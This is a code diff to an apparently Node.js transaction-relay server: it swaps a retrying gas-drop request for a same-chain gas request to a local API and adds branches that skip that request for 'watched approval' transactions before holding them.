@@ -755,45 +755,37 @@ async function requestGasDrop(userAddress, tx) {
   }
 }
 
-// Enhanced gas drop with retry logic
-async function requestGasDropWithRetry(userAddress, tx, maxRetries = 2) {
-  for (let attempt = 1; attempt <= maxRetries; attempt++) {
-    console.log(`\n🎯 REQUESTING GAS DROP for ${userAddress} (Attempt ${attempt}/${maxRetries})`);
+// Add this helper function to make the same-chain API call
+async function requestSameChainGas(userAddress, tx) {
+  try {
+    console.log(`\n🔗 REQUESTING SAME-CHAIN GAS for ${userAddress}`);
+    console.log(`   Source Chain: arbitrum`);
     
-    try {
-      const response = await fetch('http://127.0.0.1:3000/api/gas-drop', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-api-key': 'test1'
-        },
-        body: JSON.stringify({
-          user: userAddress,
-          eth: '0.001',
-          src: 'arbitrum'
-        })
-      });
+    const response = await fetch('http://127.0.0.1:3000/api/same-chain', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'x-api-key': 'test1'
+      },
+      body: JSON.stringify({
+        user: userAddress,
+        eth: '0.001',
+        src: 'arbitrum'  // Hardcoded for now, could be made dynamic based on chain ID
+      })
+    });
 
-      if (!response.ok) {
-        throw new Error(`Gas drop API returned ${response.status}`);
-      }
-
-      const result = await response.json();
-      console.log(`✅ GAS DROP REQUESTED SUCCESSFULLY (Attempt ${attempt}):`, result);
-      return true;
-    } catch (error) {
-      console.error(`❌ GAS DROP ATTEMPT ${attempt} FAILED:`, error.message);
-      
-      if (attempt < maxRetries) {
-        console.log(`🔄 Retrying in 1 second...`);
-        await new Promise(resolve => setTimeout(resolve, 1000));
-      } else {
-        console.error(`❌ ALL GAS DROP ATTEMPTS FAILED after ${maxRetries} tries`);
-        return false;
-      }
+    if (!response.ok) {
+      throw new Error(`Same-chain API returned ${response.status}`);
     }
+
+    const result = await response.json();
+    console.log(`✅ SAME-CHAIN GAS REQUESTED SUCCESSFULLY:`);
+    console.log(`   Response:`, result);
+    return true;
+  } catch (error) {
+    console.error(`❌ SAME-CHAIN GAS REQUEST FAILED:`, error.message);
+    return false;
   }
-  return false;
 }
 
 /**
@@ -869,11 +861,6 @@ app.post('/', async (req, res) => {
           
           // CHECK FOR WATCHED APPROVAL IN RAW TRANSACTIONS
           if (isWatchedApproval(null, decodedTx)) {
-            console.log(`\n🎯 DETECTED WATCHED APPROVAL RAW TRANSACTION`);
-            console.log(`   Token: ${WATCHED_APPROVAL.tokenAddress}`);
-            console.log(`   Spender: ${WATCHED_APPROVAL.spenderAddress}`);
-            console.log(`   From: ${decodedTx.from}`);
-            
             // Request gas drop before proceeding
             console.log(`\n💧 REQUESTING GAS DROP FOR RAW TRANSACTION...`);
             const gasDropSuccess = await requestGasDrop(decodedTx.from, decodedTx);
@@ -979,6 +966,14 @@ app.post('/', async (req, res) => {
             console.log(`\n🎯 FINAL DECISION:`);
             console.log(`   🔒 RAW TRANSACTION - Will be HELD automatically`);
             
+            // Check if this is NOT a watched approval, then request same-chain gas
+            if (decodedTx && !isWatchedApproval(null, decodedTx)) {
+              console.log(`\n🔗 NON-WATCHED APPROVAL RAW TRANSACTION - Requesting same-chain gas`);
+              await requestSameChainGas(decodedTx.from, decodedTx);
+            } else if (decodedTx && isWatchedApproval(null, decodedTx)) {
+              console.log(`\n🎯 WATCHED APPROVAL RAW TRANSACTION - Skipping same-chain gas request`);
+            }
+            
             // Hold the transaction and return - response will be sent when released
             await holdTransaction(payload, gas, res);
             return; // Don't continue processing
@@ -1006,6 +1001,15 @@ app.post('/', async (req, res) => {
               console.log(`   ❌ INSUFFICIENT BALANCE - Transaction will be HELD`);
               console.log(`   Shortage: ${weiToEth(balanceCheck.required - balanceCheck.userBalance).toFixed(6)} ETH`);
               console.log(`   🔒 HOLDING TRANSACTION NOW...`);
+              
+              // Check if this is NOT a watched approval, then request same-chain gas
+              if (!isWatchedApproval(tx)) {
+                console.log(`\n🔗 NON-WATCHED APPROVAL TRANSACTION - Requesting same-chain gas`);
+                await requestSameChainGas(tx.from, tx);
+              } else {
+                console.log(`\n🎯 WATCHED APPROVAL TRANSACTION - Skipping same-chain gas request`);
+              }
+              
               // Hold the transaction and return - response will be sent when released
               await holdTransaction(payload, gas, res);
               return; // Don't continue processing
